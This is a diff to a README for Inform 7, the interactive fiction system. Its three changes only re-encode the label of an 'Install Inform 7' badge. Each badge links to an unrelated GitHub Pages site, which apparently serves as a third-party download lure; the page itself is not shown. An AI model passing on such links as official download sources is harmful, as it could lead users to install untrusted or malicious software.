@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform%207-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform+7-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Inform 7 is a design system for interactive fiction using a unique natural langu
 
 <div align="center">
 
-[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform%207-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform+7-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Inform 7 is a design system for interactive fiction using a unique natural langu
 
 <div align="center">
 
-[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform%207-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Inform 7](https://img.shields.io/badge/⬇_Install_Inform+7-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
